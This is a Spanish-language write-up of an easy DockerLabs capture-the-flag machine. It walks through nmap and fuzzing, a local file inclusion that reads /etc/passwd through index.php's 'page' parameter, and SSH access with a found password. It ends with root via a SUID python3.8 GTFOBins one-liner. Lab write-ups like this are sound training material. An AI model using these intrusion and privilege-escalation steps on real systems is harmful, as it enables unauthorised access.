Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #lfi #parameter-fuzzing #password-reuse #suid-abuse

![](assets/Pasted%20image%2020251109193730.png)

## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad.

```bash
> ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.827 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.827/0.827/0.827/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
> sudo nmap -p- --open -Pn -n -sS --min-rate 5000 172.17.0.2
------------------------------------------------------------
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: B6:F0:3B:69:14:E0 (Unknown)
```

- Puertos 22 y 80 abiertos.

Sobre los puertos abiertos realizo un segundo escaneo más profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
> nmap -p 22,80 -sCV -Pn -n -sS --min-rate 5000 172.17.0.2 -oN target.txt
--------------------------------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e1:b8:ce:5c:65:5a:75:9e:ed:30:7a:2b:b2:25:47:6b (RSA)
|   256 a3:78:9f:44:57:0e:15:4f:15:93:59:d0:04:89:a9:f4 (ECDSA)
|_  256 5a:7a:89:3c:ed:da:4a:b4:a0:63:d3:ba:04:39:c3:a4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: B6:F0:3B:69:14:E0 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Puerto 22 SSH OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
- Puerto 80 HTTP Apache httpd 2.4.41 (Ubuntu)

## Enumeración

### Puerto 80 HTTP

La página principal muestra la página por defecto de Apache2.

![](assets/Pasted%20image%2020251109144335.png)

**Fuzzing de Directorios.**

Utilizo `gobuster` para descubrir posibles recursos en el servidor web.

```bash
> gobuster dir -w raft-medium-directories.txt -u http://172.17.0.2/ -x html,php,py,js,phar,php4
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/index.php            (Status: 200) [Size: 110]
/server-status        (Status: 403) [Size: 275]
```

Encuentro un archivo `index.php` que contiene el siguiente mensaje:

![](assets/Pasted%20image%2020251109144427.png)

El mensaje indica que existe un archivo llamado `balu` en algún lugar del sistema. Como estamos en un servidor Apache2, la ruta por defecto es `/var/www/html`, por lo que intento acceder directamente al archivo.

![](assets/Pasted%20image%2020251109150235.png)

- Encuentro la contraseña: `balu`

## Explotación

### Local File Inclusion (LFI)

La aplicación web parece tener capacidad para listar archivos. Decido fuzzear el archivo `index.php` para descubrir parámetros vulnerables que permitan leer archivos arbitrarios.

```bash
> ffuf -w raft-large-directories.txt:FUZZ -u http://172.17.0.2/index.php?FUZZ=/etc/passwd -fw 12
-----------------------------------------------------------------------------------------------
page   [Status: 200, Size: 1367, Words: 11, Lines: 27, Duration: 2ms]
```

- Descubro el parámetro `page` vulnerable a LFI.

Ahora puedo leer archivos del sistema accediendo a `http://172.17.0.2/index.php?page=/etc/passwd`.

![](assets/Pasted%20image%2020251109151030.png)

Del archivo `/etc/passwd` identifico dos usuarios del sistema:
- `pinguino`
- `mario`

### Acceso SSH

Con la contraseña `balu` encontrada anteriormente y los usuarios identificados, intento acceder por SSH.

```bash
> ssh pinguino@172.17.0.2
pinguino@172.17.0.2's password: balu
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)

pinguino@dockerlabs:~$ whoami
pinguino
pinguino@dockerlabs:~$ id
uid=1000(pinguino) gid=1000(pinguino) groups=1000(pinguino)
```

- Acceso exitoso con las credenciales `pinguino:balu`

## Escalada de Privilegios

### Migración al usuario mario

Dentro del sistema encuentro un archivo que revela la contraseña del usuario `mario`.

```bash
> pinguino@dockerlabs:~$ ls
nota_mario.txt
pinguino@dockerlabs:~$ cat nota_mario.txt
La contraseña de mario es: invitaacachopo
```

- Contraseña de mario: `invitaacachopo`

Migro al usuario `mario` con la contraseña encontrada.

```bash
> pinguino@dockerlabs:~$ su mario
Password: invitaacachopo
mario@dockerlabs:/home/pinguino$ whoami
mario
```

### Abuso de SUID para Escalada a Root

Busco binarios con permisos SUID que puedan ser explotados para escalar privilegios.

```bash
> mario@dockerlabs:/home$ find / -perm -4000 2>/dev/null
----------------------------------------------------------
/usr/bin/python3.8
```

Encuentro que el binario `python3.8` tiene el bit SUID activado y pertenece a root. Esto significa que cuando se ejecuta, lo hace con los privilegios del propietario (root).

Consulto [GTFOBins](https://gtfobins.github.io/gtfobins/python/) para encontrar formas de abusar de Python con SUID. Utilizo el siguiente comando para obtener una shell con privilegios elevados.

```bash
> mario@dockerlabs:/home$ /usr/bin/python3.8 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
bash-5.0# whoami
root
bash-5.0# id
uid=1001(mario) gid=1001(mario) euid=0(root) groups=1001(mario)
```

El output muestra:
- `uid=1001(mario)`: Identidad real del usuario (mario)
- `euid=0(root)`: Privilegios efectivos (root)

Esto significa que aunque la identidad real sigue siendo mario, los privilegios efectivos son de root, lo que permite ejecutar comandos con permisos de superusuario.

***PWNED***